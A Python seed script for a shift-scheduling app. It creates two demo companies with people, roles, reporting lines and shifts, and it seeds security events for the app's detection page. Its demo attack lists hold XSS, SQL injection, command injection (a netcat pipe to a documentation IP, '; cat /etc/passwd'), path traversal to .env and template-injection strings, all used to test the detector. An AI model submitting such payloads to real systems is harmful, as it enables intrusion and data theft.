"""Demo data: two companies with their departments, teams, and people.

    python -m scripts.seed_demo

For local work, the tests, and the demos (decision 0031, docs/features/organization.md).
The two companies are built alike on purpose (same department and team names, the same
kinds of people), so a leak from one company into the other is obvious in tests and demos.

- Gives the same result on every run: it only adds what is missing. A company that already
  exists keeps its structure; it only gains its reporting lines, passwords for accounts
  without one, and its shifts, if an earlier run could not add them yet. After that, a
  run changes nothing.
- Seeds each company in four steps, each all or nothing (its own transaction): the
  structure (departments, teams, people, roles), the reporting lines, the missing demo
  passwords, then all of the shifts with their audit entries. If a step fails, nothing of
  that step is kept and the steps before it stay: a failed first step leaves no company,
  so the next run builds it from the start; a refused shift keeps no shifts, but the
  company, its lines, and its passwords stay. The steps are separate on purpose, so lines,
  passwords, and shifts can come on a later run.
- Refuses to run against a production database (APP_ENV=production).
- Uses the reserved example.com and example.org email domains.
- Creates companies the only way the design allows: from a session with no company
  (platform code), then everything inside a company from a session for that company, so
  the company filter fills in and checks company_id as it does for the app.

Demo passwords: with DEMO_PASSWORD set (in .env or the environment), every demo account
without a password gets that one, checked against the password rules and hashed with
Argon2id like any other (app/auth/passwords.py). Without it, the accounts have no password
and cannot sign in. The password itself is never written in the repository.

Each person gets the role recorded below (Z1), with the starting roles. Each company then
gets two weeks of shifts (SD1), from the day the script runs (in the company's time zone)
for 14 days, so the demo always has a schedule ahead.

The shifts are created the way a manager creates them in the application: through the
schedules service (create_shift), acting as the demo manager who plans each one. So every
demo shift passes the same permission check (authorize()) and the same rules (times, who
can be assigned, no double booking, not already ended), and is written to the audit log
under that manager's name, exactly like one made on the website. If the rules change, the
demo data follows without changes here; if a demo shift breaks a rule, the script stops
and says which one. The shifts are added once: a company that already has shifts is left
alone. They wait until everyone they need has a password, because the application never
assigns a shift to someone who has not set up their account.

Reporting lines (Z2) come right after the company: REPORTING_LINES below, added through the
same service the application uses, once per company.

Security events (DT6) come last, so the security page has something to show before any
real traffic exists: DEMO_ATTACKS below, over the last 30 days, by several people, of every
attack type, plus one burst that the rate cap cuts short (a detection.summary row). Each
attack is a value that the real detector is run on (app/detection), so its pattern and
excerpt are exactly what the application would store; a demo value the detector does not
flag stops the script. The events are then handed to the same writer the application uses
(app/modules/security/writer.py), with its clock set to the demo moments, so they pass the
same table rule (DE9) and rate cap (DE6). A few events from people not signed in, and one
count of dropped copies (DE11), go to the platform table once. Added once: a company that
already has security events is left alone.
"""

from __future__ import annotations

import sys
import uuid
from dataclasses import dataclass
from datetime import UTC, date, datetime, time, timedelta
from zoneinfo import ZoneInfo

from fastapi import HTTPException
from sqlalchemy import Engine, create_engine, func, select
from sqlalchemy.orm import Session

from app.audit import Actor
from app.auth.passwords import PasswordRejected, check_password, hash_password
from app.authz.chain import ReportingLineError, add_reporting_line
from app.authz.models import ReportingLine
from app.authz.roles import assign_role, create_starting_roles
from app.core.config import get_settings
from app.db.base import utcnow
from app.detection.detector import inspect
from app.modules.org.models import Company, Department, Team, TeamMember, User
from app.modules.schedules import repository as shift_repository
from app.modules.schedules.models import Shift
from app.modules.schedules.schemas import ShiftCreate
from app.modules.schedules.service import create_shift
from app.modules.security.models import PlatformSecurityEvent, SecurityEvent
from app.modules.security.writer import PER_MINUTE, Event, EventWriter
from app.tenancy.context import set_company


@dataclass(frozen=True)
class Person:
    """One demo person: their name, home department, teams, and intended role."""

    name: str
    department: str
    teams: tuple[str, ...]
    # The starting role this person gets once roles exist (Z1): owner, administrator,
    # manager, or employee.
    role: str
    # For a manager of one team only: that team. None: a manager of their whole home
    # department.
    manages: str | None = None


@dataclass(frozen=True)
class CompanyPlan:
    """One demo company: its name, time zone, email domain, and people."""

    name: str
    timezone: str
    email_domain: str
    people: tuple[Person, ...]


# The same departments and teams in both companies.
DEPARTMENTS: dict[str, tuple[str, ...]] = {
    "Kitchen": ("Morning Prep", "Weekend Crew"),
    "Front of House": ("Hosts",),
    "Office": ("Leadership",),
}

DEMO_COMPANIES = (
    CompanyPlan(
        name="Northwind Cafe",
        timezone="America/Chicago",
        email_domain="example.com",
        people=(
            Person("Olivia Hart", "Office", ("Leadership",), "owner"),
            Person("Marcus Lee", "Office", ("Leadership",), "administrator"),
            Person("Ana Diaz", "Kitchen", ("Morning Prep",), "manager"),
            Person("Priya Shah", "Front of House", ("Hosts",), "manager"),
            # On two teams.
            Person("Ben Okafor", "Kitchen", ("Weekend Crew", "Morning Prep"), "employee"),
            Person("Cara Lund", "Kitchen", ("Weekend Crew",), "employee"),
            Person("Diego Ruiz", "Front of House", ("Hosts",), "employee"),
            # On no team: only their home department.
            Person("Ella Novak", "Front of House", (), "employee"),
            # Manages one team only: the Weekend Crew's shifts, nothing else in the Kitchen.
            Person("Felix Grant", "Kitchen", ("Weekend Crew",), "manager", "Weekend Crew"),
            # A second administrator, who reports to the first (an administrator over
            # another administrator, Z2). Last in the list, so the indexes below stay put.
            Person("Sofia Reyes", "Office", ("Leadership",), "administrator"),
        ),
    ),
    CompanyPlan(
        name="Summit Outfitters",
        timezone="America/Denver",
        email_domain="example.org",
        people=(
            Person("Grace Kim", "Office", ("Leadership",), "owner"),
            Person("Henry Adams", "Office", ("Leadership",), "administrator"),
            Person("Isabel Cruz", "Kitchen", ("Morning Prep",), "manager"),
            Person("Jamal Brooks", "Front of House", ("Hosts",), "manager"),
            Person("Kai Tanaka", "Kitchen", ("Weekend Crew", "Morning Prep"), "employee"),
            Person("Lena Fischer", "Kitchen", ("Weekend Crew",), "employee"),
            Person("Mateo Silva", "Front of House", ("Hosts",), "employee"),
            Person("Nora Quinn", "Front of House", (), "employee"),
            Person("Owen Park", "Kitchen", ("Weekend Crew",), "manager", "Weekend Crew"),
            Person("Theo Walsh", "Office", ("Leadership",), "administrator"),
        ),
    ),
)


# Who works the demo shifts, by their place in each company's list of people above. Both
# companies list their people in the same order, so the same pattern gives both the same
# schedule with different names (a leak between them stays obvious).
KITCHEN_MANAGER = 2  # Ana Diaz / Isabel Cruz
FRONT_MANAGER = 3  # Priya Shah / Jamal Brooks
KITCHEN_A = 4  # Ben Okafor / Kai Tanaka
KITCHEN_B = 5  # Cara Lund / Lena Fischer
FRONT_A = 6  # Diego Ruiz / Mateo Silva
FRONT_B = 7  # Ella Novak / Nora Quinn
CREW_LEAD = 8  # Felix Grant / Owen Park: manager of the Weekend Crew only
OWNER = 0  # Olivia Hart / Grace Kim
ADMINISTRATOR = 1  # Marcus Lee / Henry Adams
SECOND_ADMINISTRATOR = 9  # Sofia Reyes / Theo Walsh

# Who reports to whom (Z2), as (manager, employee) by place in the list of people. The same
# in both companies. It covers what the rules and the demo need (organization.md, demo
# data):
# - a chain of several levels: Cara reports to the crew lead, who reports to the Kitchen
#   manager, who reports to the administrator, who reports to the owner;
# - someone with two managers: Ben reports to the Kitchen manager and to the crew lead;
# - an administrator over another administrator: Sofia reports to Marcus;
# - someone with no manager: Ella (FRONT_B), so only the Owner can manage her and her
#   requests go straight to the Owner (decision 0029).
# The Owner is above everyone anyway; the line from the administrator to the owner records
# whom the administrator reports to, which later decides where their requests go.
REPORTING_LINES = (
    (OWNER, ADMINISTRATOR),
    (ADMINISTRATOR, SECOND_ADMINISTRATOR),
    (ADMINISTRATOR, KITCHEN_MANAGER),
    (ADMINISTRATOR, FRONT_MANAGER),
    (KITCHEN_MANAGER, CREW_LEAD),
    (KITCHEN_MANAGER, KITCHEN_A),
    (CREW_LEAD, KITCHEN_A),
    (CREW_LEAD, KITCHEN_B),
    (FRONT_MANAGER, FRONT_A),
)

# Who plans a department's shifts, unless a shift names someone else.
DEPARTMENT_MANAGER = {"Kitchen": KITCHEN_MANAGER, "Front of House": FRONT_MANAGER}


@dataclass(frozen=True)
class ShiftPlan:
    """One demo shift in the weekly pattern, in the workplace's local time."""

    weekday: int  # 0 is Monday
    department: str
    start: str  # "HH:MM", local time
    end: str  # "HH:MM", local time, on the same day
    worker: int | None  # an index into the company's people; None for an open shift
    details: str
    # Extra text, only in the first week, so the screens show notes and events.
    notes: str | None = None
    event_name: str | None = None
    event_description: str | None = None
    # Who creates the shift in the application: an index into the company's people. None:
    # the department's manager (DEPARTMENT_MANAGER).
    planner: int | None = None


# One week of shifts, used for both demo weeks. It covers what the demo and the security
# tests need: shifts in two departments, open shifts, a note, an event, and people with
# several shifts. No person ever has two shifts at the same time, and none is longer than
# 12 hours: the same rules the application enforces (and checks while seeding).
#
# Each shift is created by a manager whose scope covers it, as authorize() requires: the
# department managers plan their departments, and the Weekend Crew lead plans the crew's
# Saturday shifts. The lead could not create Sunday's open Kitchen shift: an open shift
# belongs to its department alone, outside one team's scope (schedules/scope.py), so the
# Kitchen manager plans that one.
WEEK_PATTERN = (
    # Kitchen
    ShiftPlan(0, "Kitchen", "07:00", "15:00", KITCHEN_MANAGER, "Prep line"),
    ShiftPlan(0, "Kitchen", "15:00", "23:00", KITCHEN_A, "Grill"),
    ShiftPlan(1, "Kitchen", "07:00", "15:00", KITCHEN_B, "Prep line"),
    ShiftPlan(1, "Kitchen", "15:00", "23:00", KITCHEN_A, "Grill"),
    ShiftPlan(
        2,
        "Kitchen",
        "07:00",
        "15:00",
        KITCHEN_MANAGER,
        "Prep line",
        notes="Deliveries arrive at 8; check the produce order against the invoice.",
    ),
    ShiftPlan(2, "Kitchen", "15:00", "23:00", KITCHEN_B, "Grill"),
    ShiftPlan(3, "Kitchen", "07:00", "15:00", KITCHEN_B, "Prep line"),
    ShiftPlan(3, "Kitchen", "15:00", "23:00", None, "Grill"),
    ShiftPlan(4, "Kitchen", "07:00", "15:00", KITCHEN_MANAGER, "Prep line"),
    ShiftPlan(
        4,
        "Kitchen",
        "16:00",
        "23:30",
        KITCHEN_A,
        "Grill",
        event_name="Inventory night",
        event_description="Count the walk-in and dry storage after close.",
    ),
    # Saturday: both workers are on the Weekend Crew, so its lead plans their shifts.
    ShiftPlan(5, "Kitchen", "09:00", "17:00", KITCHEN_B, "Prep line", planner=CREW_LEAD),
    ShiftPlan(5, "Kitchen", "15:00", "23:00", KITCHEN_A, "Grill", planner=CREW_LEAD),
    ShiftPlan(6, "Kitchen", "10:00", "18:00", None, "Prep line"),
    # Front of House
    ShiftPlan(0, "Front of House", "10:00", "18:00", FRONT_MANAGER, "Host"),
    ShiftPlan(1, "Front of House", "10:00", "18:00", FRONT_A, "Host"),
    ShiftPlan(2, "Front of House", "16:00", "22:00", FRONT_B, "Host"),
    ShiftPlan(3, "Front of House", "10:00", "18:00", FRONT_MANAGER, "Host"),
    ShiftPlan(4, "Front of House", "16:00", "22:00", FRONT_A, "Host"),
    ShiftPlan(5, "Front of House", "10:00", "18:00", FRONT_A, "Host"),
    ShiftPlan(5, "Front of House", "16:00", "22:00", None, "Host"),
    ShiftPlan(6, "Front of House", "10:00", "18:00", FRONT_B, "Host"),
)

# How many days of shifts each company gets, starting on the day the script runs.
DEMO_DAYS = 14


# --- Demo security events (DT6) -------------------------------------------------------


@dataclass(frozen=True)
class DemoAttack:
    """One request with attack-like text, by one demo person, some days ago."""

    person: int  # place in the company's list of people (as in REPORTING_LINES)
    days_ago: int
    hour: int  # UTC hour of that day, so the events spread over the day
    method: str
    route: str  # the route TEMPLATE, as the detection layer stores it
    field: str
    value: str  # what was sent; the detector decides its pattern and excerpt


# Every attack type, by several people, spread over the last 30 days so the summary's two
# windows (7 and 30 days) show different counts. The same in both companies, so a leak
# between them stays obvious. The XSS value would run if the page showed it unsafely: the
# demo shows that it appears as plain text instead (DE7).
DEMO_ATTACKS = (
    DemoAttack(
        KITCHEN_A,
        1,
        15,
        "PATCH",
        "/api/shifts/{shift_id}",
        "body.notes",
        "<img src=x onerror=alert(1)>",
    ),
    DemoAttack(KITCHEN_B, 2, 10, "GET", "/api/teams", "query.department_id", "' OR 1=1 --"),
    DemoAttack(FRONT_A, 3, 18, "POST", "/api/shifts", "body.notes", "{0.__class__}"),
    DemoAttack(CREW_LEAD, 5, 9, "PATCH", "/api/shifts/{shift_id}", "body.notes", "$(whoami)"),
    DemoAttack(KITCHEN_A, 6, 20, "GET", "/api/departments", "query.cursor", "../../etc/passwd"),
    DemoAttack(
        FRONT_A,
        9,
        13,
        "GET",
        "/api/teams",
        "query.department_id",
        "admin' UNION SELECT email FROM users --",
    ),
    DemoAttack(
        KITCHEN_B, 12, 16, "POST", "/api/shifts", "body.notes", "<script>alert('hi')</script>"
    ),
    DemoAttack(
        CREW_LEAD, 15, 11, "PATCH", "/api/shifts/{shift_id}", "body.notes", "| nc 203.0.113.9 4444"
    ),
    DemoAttack(FRONT_B, 20, 14, "POST", "/api/shifts", "body.notes", "%x.%x.%x.%x"),
    DemoAttack(
        KITCHEN_A, 25, 17, "GET", "/api/departments", "query.cursor", "..%2f..%2fapp%2f.env"
    ),
    DemoAttack(FRONT_B, 28, 12, "PATCH", "/api/shifts/{shift_id}", "body.notes", "{{7*7}}"),
)
# One burst: the same person sends BURST_SIZE attack values within one minute, 4 days ago.
# The rate cap writes the first PER_MINUTE as rows and one detection.summary row for the
# rest, exactly as it would for a real flood (DE6).
BURST = DemoAttack(
    FRONT_B, 4, 19, "PATCH", "/api/shifts/{shift_id}", "body.notes", "javascript:alert(1)"
)
BURST_SIZE = PER_MINUTE + 5
# From people not signed in (platform_security_events: no company, no person, DE9), and
# how many request copies a full queue dropped once (detection.dropped, DE11).
PLATFORM_ATTACKS = (
    (2, "GET", "/api/departments", "query.cursor", "' OR '1'='1"),
    (8, "GET", "/api/teams", "query.department_id", "<svg onload=alert(1)>"),
    (16, "GET", "/api/departments", "query.cursor", "; cat /etc/passwd"),
)
DEMO_DROPPED = (3, 37)  # 3 days ago, 37 copies dropped
# Documentation addresses (RFC 5737): never a real sender.
DEMO_ADDRESSES = ("203.0.113.10", "203.0.113.11", "198.51.100.20", "198.51.100.21")


def _demo_events(
    attack: DemoAttack,
    at: datetime,
    *,
    company_id: uuid.UUID | None,
    user_id: uuid.UUID | None,
    source: str,
    address: str,
) -> list[Event]:
    """The events the detector finds in one demo request (one per matching pattern)."""
    findings = inspect([(attack.field, attack.value)])
    if not findings:
        raise SeedRefused(f"the detector does not flag the demo value {attack.value!r}")
    return [
        Event(
            kind=f"detection.{finding.kind}",
            source=source,
            occurred_at=at,
            pattern_id=finding.pattern_id,
            field=finding.field,
            method=attack.method,
            route=attack.route,
            client_address=address,
            request_id=f"demo-{uuid.uuid4().hex[:12]}",
            excerpt=finding.excerpt,
            company_id=company_id,
            user_id=user_id,
        )
        for finding in findings
    ]


def _moment(now: datetime, days_ago: int, hour: int) -> datetime:
    """A demo moment in naive UTC (as stored): that many days ago, at that UTC hour."""
    day = (now - timedelta(days=days_ago)).astimezone(UTC).replace(tzinfo=None)
    return day.replace(hour=hour, minute=7, second=0, microsecond=0)


def seed_security_events(engine: Engine, plan: CompanyPlan, now: datetime | None = None) -> int:
    """Give a company its demo security events, unless it already has some. Returns how
    many rows were added (events plus the burst's summary row): 0 if it had events.

    Through the application's own writer (see the top of this file). Each writer writes a
    company's rows in one transaction; the burst's summary row is written when that
    writer is closed, in a second one. If that second one failed, the company would keep
    its events without the summary; the next run would leave it alone (it has events), so
    reset the database and seed again.
    """
    now = now or datetime.now(UTC)
    with Session(engine) as platform:
        company_id = platform.scalars(select(Company.id).where(Company.name == plan.name)).one()
    with Session(engine) as session:
        set_company(session, company_id)
        # Counting a column of the model lets the company filter apply.
        if session.scalar(select(func.count(SecurityEvent.company_id))):
            return 0
        people = {u.display_name: u.id for u in session.scalars(select(User))}

    def person_id(index: int) -> uuid.UUID:
        return people[plan.people[index].name]

    # 1. The spread-out attacks. Each person is one source (their session), and none sends
    #    more than PER_MINUTE here, so the cap writes every one as a row.
    events: list[Event] = []
    for number, attack in enumerate(DEMO_ATTACKS):
        events += _demo_events(
            attack,
            _moment(now, attack.days_ago, attack.hour),
            company_id=company_id,
            user_id=person_id(attack.person),
            source=f"session:demo-{attack.person}",
            address=DEMO_ADDRESSES[number % 2],
        )
    spread = EventWriter(engine)
    spread.write(events)
    spread.close()

    # 2. The burst, with the writer's clock at the burst's minute, so the cap counts it in
    #    that minute and dates the summary row at its end, as it would have on the day.
    burst_at = _moment(now, BURST.days_ago, BURST.hour)
    burst: list[Event] = []
    for _ in range(BURST_SIZE):
        burst += _demo_events(
            BURST,
            burst_at,
            company_id=company_id,
            user_id=person_id(BURST.person),
            source=f"session:demo-burst-{BURST.person}",
            address=DEMO_ADDRESSES[0],
        )
    capped = EventWriter(engine, clock=lambda: burst_at)
    capped.write(burst)
    capped.close()  # writes the detection.summary row for the events held back

    with Session(engine) as session:
        set_company(session, company_id)
        return int(session.scalar(select(func.count(SecurityEvent.company_id))) or 0)


def seed_platform_events(engine: Engine, now: datetime | None = None) -> int:
    """Add the demo events of people not signed in, and one drop count, unless the
    platform table already has rows. Returns how many rows were added."""
    now = now or datetime.now(UTC)
    with Session(engine) as platform:
        if platform.scalar(select(func.count(PlatformSecurityEvent.id))):
            return 0
    events: list[Event] = []
    for number, (days_ago, method, route, field, value) in enumerate(PLATFORM_ATTACKS):
        attack = DemoAttack(0, days_ago, 21, method, route, field, value)
        address = DEMO_ADDRESSES[2 + number % 2]
        events += _demo_events(
            attack,
            _moment(now, days_ago, 21),
            company_id=None,
            user_id=None,
            source=f"address:{address}",
            address=address,
        )
    EventWriter(engine).write(events)
    days_ago, dropped = DEMO_DROPPED
    EventWriter(engine, clock=lambda: _moment(now, days_ago, 22)).record_dropped(dropped)
    return len(events) + 1


def email_for(person: Person, domain: str) -> str:
    """The demo email address, e.g. "ana.diaz@example.com"."""
    return f"{person.name.lower().replace(' ', '.')}@{domain}"


def seed_company(engine: Engine, plan: CompanyPlan) -> bool:
    """Create one demo company with everything in it. Returns False if it already exists.

    All or nothing: the company and everything in it are saved in one database
    transaction. If any step fails, nothing is kept, not even the company row, so the next
    run starts this company again instead of finding a half-built one and skipping it.
    """
    # One connection and one transaction for the whole company. engine.begin() commits
    # when the block ends normally and rolls everything back if anything inside raises.
    # Both sessions below run inside this transaction: a session given a connection that
    # is already in a transaction only flushes (sends its rows); it never commits or rolls
    # back the transaction itself.
    with engine.begin() as connection:
        # 1. The company itself, created by platform code: a session with no company. If a
        #    company with this name already exists, leave it as it is. (Because creating a
        #    company is all or nothing, an existing one is always complete.)
        with Session(connection) as platform:
            if platform.scalars(select(Company.id).where(Company.name == plan.name)).first():
                return False
            company = Company(name=plan.name, timezone=plan.timezone)
            platform.add(company)
            platform.flush()  # sends the row and gives the company its ID; not saved yet
            company_id = company.id

        # 2. Everything inside the company, from a session working for it: the company
        #    filter fills in company_id on every row and refuses anything for another
        #    company.
        with Session(connection) as session:
            set_company(session, company_id)
            _seed_inside_company(session, plan)
    return True


def _seed_inside_company(session: Session, plan: CompanyPlan) -> None:
    """Add a company's departments, teams, people, and team memberships to the session."""
    # Departments, then their teams.
    departments = {name: Department(name=name) for name in DEPARTMENTS}
    session.add_all(departments.values())
    session.flush()  # gives the departments their IDs for the teams and people
    teams = {
        team: Team(name=team, department_id=departments[department].id)
        for department, team_names in DEPARTMENTS.items()
        for team in team_names
    }
    session.add_all(teams.values())

    # The people, each with a home department (passwords come afterwards, from
    # set_demo_passwords).
    users = {
        person.name: User(
            email=email_for(person, plan.email_domain),
            display_name=person.name,
            department_id=departments[person.department].id,
        )
        for person in plan.people
    }
    session.add_all(users.values())
    session.flush()  # gives the teams and people their IDs for the memberships

    # Team memberships.
    session.add_all(
        TeamMember(team_id=teams[team].id, user_id=users[person.name].id)
        for person in plan.people
        for team in person.teams
    )
    session.flush()

    # The starting roles, and each person's roles (authorization.md, typical scopes):
    # everyone is an Employee of their home department; owners and administrators hold
    # their role for the whole company; managers for their home department, or for the one
    # team they manage. Created by the system (platform code), and audited like any role
    # change.
    roles = create_starting_roles(session, Actor.system())
    for person in plan.people:
        user = users[person.name]
        assign_role(
            session,
            Actor.system(),
            user_id=user.id,
            role=roles["employee"],
            scope_type="department",
            scope_id=user.department_id,
        )
        if person.role in ("owner", "administrator"):
            assign_role(
                session,
                Actor.system(),
                user_id=user.id,
                role=roles[person.role],
                scope_type="company",
            )
        elif person.role == "manager" and person.manages is not None:
            # A manager of one team only.
            assign_role(
                session,
                Actor.system(),
                user_id=user.id,
                role=roles["manager"],
                scope_type="team",
                scope_id=teams[person.manages].id,
            )
        elif person.role == "manager":
            assign_role(
                session,
                Actor.system(),
                user_id=user.id,
                role=roles["manager"],
                scope_type="department",
                scope_id=user.department_id,
            )

    # Send everything, inside the caller's transaction: closing a session drops anything
    # not yet flushed, and only the caller's transaction decides what is kept.
    session.flush()


def local_to_utc(day: date, clock: str, timezone: str) -> datetime:
    """A local wall-clock time on a day, as the UTC moment the database stores (without a
    zone, like every stored moment). ZoneInfo applies that day's daylight-saving rule."""
    hours, minutes = (int(part) for part in clock.split(":"))
    local = datetime.combine(day, time(hours, minutes), tzinfo=ZoneInfo(timezone))
    return local.astimezone(UTC).replace(tzinfo=None)


class SeedRefused(RuntimeError):
    """The demo data cannot be added: the application refused part of it (a bug here), or
    the company was seeded by an older version of this script."""


def seed_reporting_lines(engine: Engine, plan: CompanyPlan) -> int:
    """Add the company's reporting lines (REPORTING_LINES), unless it already has some.
    Returns how many were added: 0 if it had lines already.

    Each line goes through the same service the application will use
    (app/authz/chain.py, add_reporting_line), as the system, so it passes the same rules
    (nobody reports to themselves, no duplicates, no loops) and is written to the audit
    log. All or nothing: the lines and their audit entries are saved in one transaction.
    """
    # Find the company, as platform code (no company on the session).
    with Session(engine) as platform:
        company_id = platform.scalars(select(Company.id).where(Company.name == plan.name)).one()

    with engine.begin() as connection, Session(connection) as session:
        set_company(session, company_id)
        # Already has lines (an earlier run): leave them as they are. Counting a column of
        # the model lets the company filter apply.
        if session.scalar(select(func.count(ReportingLine.company_id))):
            return 0

        people = {u.display_name: u for u in session.scalars(select(User))}
        # A company seeded before someone in the lines joined the demo data (such as the
        # second administrator): the script never changes an existing company's people.
        needed = {index for pair in REPORTING_LINES for index in pair}
        missing = sorted(plan.people[i].name for i in needed if plan.people[i].name not in people)
        if missing:
            raise SeedRefused(
                f"{plan.name} was seeded before {', '.join(missing)} joined the demo data; "
                "reset the database and seed again"
            )

        for manager, employee in REPORTING_LINES:
            try:
                add_reporting_line(
                    session,
                    Actor.system(),
                    manager_id=people[plan.people[manager].name].id,
                    employee_id=people[plan.people[employee].name].id,
                )
            except ReportingLineError as refused:
                raise SeedRefused(
                    f"{plan.name}: {plan.people[employee].name} reporting to "
                    f"{plan.people[manager].name}: {refused}"
                ) from refused
        # Send everything; engine.begin() commits when the block ends.
        session.flush()
        return len(REPORTING_LINES)


def seed_shifts(engine: Engine, plan: CompanyPlan, now: datetime | None = None) -> int | None:
    """Give a company two weeks of shifts, unless it already has some. Returns how many
    shifts were added: 0 if it had shifts already, None if they have to wait because
    someone they need has no password yet or is deactivated.

    The shifts run from today (in the company's time zone) for DEMO_DAYS days, following
    WEEK_PATTERN by weekday. Each is created through the schedules service, as the manager
    who plans it (see the top of this file). A shift that has already ended at this moment
    is skipped (for example the 7:00 to 15:00 shift when the script runs at 16:00): the
    service would refuse it, so that nobody can write the past in after the fact. Seeded a
    few days before a demo, the start of the demo week then holds shifts that were planned
    ahead and have since happened, as in real use.

    now is the current moment (with a time zone); tests pass a fixed one. All or nothing,
    like the company itself: every shift and its audit entry are saved in one transaction,
    and if the service refuses any shift, none is kept (SeedRefused says which one).
    """
    if now is None:
        now = datetime.now(UTC)
    # Find the company, as platform code (no company on the session).
    with Session(engine) as platform:
        company_id = platform.scalars(select(Company.id).where(Company.name == plan.name)).one()

    # One transaction for all of this company's shifts. The service commits after each
    # shift, as it does for a request; "rollback_only" keeps those commits inside this
    # transaction, which engine.begin() commits only at the end (or rolls back entirely).
    with (
        engine.begin() as connection,
        Session(connection, join_transaction_mode="rollback_only") as session,
    ):
        set_company(session, company_id)
        # Already has shifts (an earlier run): leave them as they are. Counting a column of
        # the model lets the company filter apply.
        if session.scalar(select(func.count(Shift.company_id))):
            return 0

        departments = {d.name: d for d in session.scalars(select(Department))}
        people = {u.display_name: u for u in session.scalars(select(User))}

        # Everyone the pattern needs: the people who work the shifts and the managers who
        # plan them. The application only assigns shifts to someone who has set up their
        # account (has a password) and is not deactivated, and a deactivated manager holds
        # no permissions. Until all of them are ready, add none.
        needed = {
            index
            for item in WEEK_PATTERN
            for index in (item.worker, _planner(item))
            if index is not None
        }
        # A company seeded by an older version of this script may lack someone the pattern
        # now needs; the script never changes an existing company, so say how to rebuild it.
        missing = sorted(plan.people[i].name for i in needed if plan.people[i].name not in people)
        if missing:
            raise SeedRefused(
                f"{plan.name} was seeded before {', '.join(missing)} joined the demo data; "
                "reset the database and seed again"
            )
        for index in needed:
            person = people[plan.people[index].name]
            if person.password_hash is None or person.deactivated_at is not None:
                return None

        # Today in the company's time zone, and the moment the stored times compare with.
        today = now.astimezone(ZoneInfo(plan.timezone)).date()
        stored_now = now.astimezone(UTC).replace(tzinfo=None)

        added = 0
        for offset in range(DEMO_DAYS):
            day = today + timedelta(days=offset)
            for item in WEEK_PATTERN:
                if item.weekday != day.weekday():
                    continue
                department = departments[item.department]
                # The wall-clock times are in the workplace zone, worked out the way the
                # service does it: the department's own, or else the company's.
                zone = shift_repository.workplace_zone(session, department)
                starts_at = local_to_utc(day, item.start, zone)
                ends_at = local_to_utc(day, item.end, zone)
                # Already over (earlier today): skip it, as the service would refuse it.
                if ends_at <= stored_now:
                    continue
                worker = None if item.worker is None else people[plan.people[item.worker].name]
                planner = people[plan.people[_planner(item)].name]
                # Notes and events only the first time a weekday comes round.
                first_week = offset < 7
                # The same request body the website sends (times as moments with an offset).
                body = ShiftCreate(
                    department_id=department.id,
                    employee_id=worker.id if worker else None,
                    starts_at=starts_at.replace(tzinfo=UTC),
                    ends_at=ends_at.replace(tzinfo=UTC),
                    details=item.details,
                    notes=item.notes if first_week else None,
                    event_name=item.event_name if first_week else None,
                    event_description=item.event_description if first_week else None,
                )
                try:
                    create_shift(session, planner, body)
                except HTTPException as refused:
                    # Name the shift, so a broken pattern is easy to find and fix.
                    raise SeedRefused(
                        f"{plan.name}: {item.department} {day} {item.start}-{item.end}, "
                        f"planned by {planner.display_name}: "
                        f"{refused.status_code} {refused.detail}"
                    ) from refused
                added += 1
        return added


def _planner(item: ShiftPlan) -> int:
    """Who creates a shift: its own planner, or else its department's manager."""
    return item.planner if item.planner is not None else DEPARTMENT_MANAGER[item.department]


def check_demo_password(password: str) -> None:
    """Refuse a demo password that breaks the password rules for any demo person (too
    short, too common, or containing their name or their company's name), before anything
    is changed."""
    for plan in DEMO_COMPANIES:
        for person in plan.people:
            check_password(
                password,
                company_name=plan.name,
                email=email_for(person, plan.email_domain),
                display_name=person.name,
            )


def set_demo_passwords(engine: Engine, plan: CompanyPlan, password: str) -> int:
    """Give the company's accounts that have no password yet the demo password, hashed.

    Accounts that already have a password are left alone, so running the script again
    changes nothing. Returns how many accounts got the password.
    """
    # Find the company, as platform code (no company on the session).
    with Session(engine) as platform:
        company_id = platform.scalars(select(Company.id).where(Company.name == plan.name)).one()

    # Then its people, in a session working for that company.
    with Session(engine) as session:
        set_company(session, company_id)
        users = session.scalars(select(User).where(User.password_hash.is_(None))).all()
        for user in users:
            # A separate hash per account: each gets its own random salt.
            user.password_hash = hash_password(password)
            user.password_changed_at = utcnow()
        session.commit()
        return len(users)


def seed(
    engine: Engine, demo_password: str | None = None, now: datetime | None = None
) -> list[str]:
    """Create every demo company that does not exist yet, give accounts without a password
    the demo password if one is given, then add the shifts from now on; one line per
    company. now is the current moment; tests pass a fixed one."""
    # Check the demo password first, so a weak one changes nothing at all.
    if demo_password is not None:
        check_demo_password(demo_password)

    lines = []
    for plan in DEMO_COMPANIES:
        created = seed_company(engine, plan)
        state = "created" if created else "already there"

        # Reporting lines need only the people, so they come straight after the company;
        # a company seeded before lines existed gets them on the next run.
        added_lines = seed_reporting_lines(engine, plan)
        reporting = f"{added_lines} reporting lines added"

        # Passwords before shifts: shifts only go to people who have one.
        if demo_password is None:
            passwords = "no DEMO_PASSWORD, so no one can sign in"
        else:
            given = set_demo_passwords(engine, plan, demo_password)
            passwords = f"demo password set for {given} accounts"

        # Shifts last, so a company seeded before shifts existed, or before it had
        # passwords, gets them on the next run.
        added = seed_shifts(engine, plan, now)
        shifts = "shifts wait for passwords" if added is None else f"{added} shifts added"

        # Security events need only the people, but come last: they are the least
        # important part, and a demo database without them still works.
        events = f"{seed_security_events(engine, plan, now)} security events added"
        lines.append(f"{plan.name}: {state}; {reporting}; {passwords}; {shifts}; {events}")
    # Events of people not signed in belong to no company: added once, for the platform.
    lines.append(f"Platform: {seed_platform_events(engine, now)} security events added")
    return lines


def main() -> int:
    """Seed the database in DATABASE_URL, unless it is production."""
    settings = get_settings()

    # Never in production: the demo data would mix with real companies.
    if settings.is_production:
        print("refusing to seed demo data: APP_ENV is production")
        return 1

    # The demo password, if one is set; a password that breaks the rules stops here.
    demo_password = settings.demo_password.get_secret_value() if settings.demo_password else None
    if demo_password is not None:
        try:
            check_demo_password(demo_password)
        except PasswordRejected as rejected:
            print(f"refusing DEMO_PASSWORD: {rejected}")
            return 1

    engine = create_engine(settings.sqlalchemy_url)
    try:
        for line in seed(engine, demo_password):
            print(line)
    except SeedRefused as refused:
        # Nothing of that step was kept; the lines before it were printed.
        print(f"demo data refused: {refused}")
        return 1
    finally:
        engine.dispose()
    return 0


if __name__ == "__main__":
    sys.exit(main())
